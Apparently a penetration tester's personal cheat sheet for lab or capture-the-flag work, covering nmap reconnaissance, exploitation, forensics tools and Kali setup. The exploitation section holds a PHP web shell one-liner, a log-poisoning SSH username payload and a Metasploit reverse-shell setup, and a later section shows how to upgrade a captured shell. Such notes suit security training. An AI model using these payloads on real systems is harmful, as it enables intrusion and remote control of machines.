# Notes

## Reconnaissance

### Local IP address

``` bash
ip a
hostname -I
ME=$(hostname -I | xargs)
```

### Network scan

```bash
nmap -sn "$ME/24"
```

### Target scan

```bash
nmap -A -p- $TARGET
```



## Exploitation

### Web shells

* Kali: `usr/share/webshells/`
* Universal one-liner:

```php
<?php system($_GET['cmd']); ?>
```



### Log poisoning

Write to `auth.log`:

```bash
ssh '<?php system($_GET['c']); ?>'@$TARGET
```

Log file location: `/var/log/auth.log`

Goal: Reverse shell

Resources:

* https://www.hackingarticles.in/apache-log-poisoning-through-lfi/

### Wordpress security

### UDP services and webshells

Webshell using Metasploit:

```bash
msfconsole
use exploit/multi/script/web_delivery
set target 1
set payload php/meterpreter/reverse_tcp
set lhost $KALI
set srvport 8080
exploit
```

### Wildcard injection



### SUID/GUID bits, basic binary exploitation

###  Offline cracking

### Vulnerability scanning and exploit identification

### Wireshark filters

### Binary tools

* `file`
* `strings`
* `ltrace`
* `strace`
* `radare2`
* `gdb`

## Forensics

### Hex editors

* Command line: `xxd`
* Editor of choice: [wxHexEditor](https://www.wxhexeditor.org/)
  * Extract data using “Set Selection Block Start/End” > “Save As Dump”





### Reverse shell

* http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md



## Misc

### Upgrading TTY

```
# (local)
echo $TERM  # xterm-256color
stty size   # 24 80

# remote
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export SHELL=/bin/bash
# ctrl+z
stty raw -echo
fg
reset
stty rows 24 cols 80
```

### Online resources

* String conversion:
  * http://www.utilities-online.info/base64/
  * https://ringzer0ctf.com/tool
* Hash reversal:
  * https://crackstation.net/
  * https://hashes.org/search.php
  * https://md5decrypt.net/en/
  * https://hashkiller.co.uk/Cracker/MD5

### Kali settings

* Settings
  * Keyboard > Add Custom Shortcut > `gnome-terminal` / `Ctrl+Alt+T`
  * Power > Automatic suspend: off
* Dash to Dock settings 
  * Panel mode: extend to the screen edge
  * Intelligent autohide: off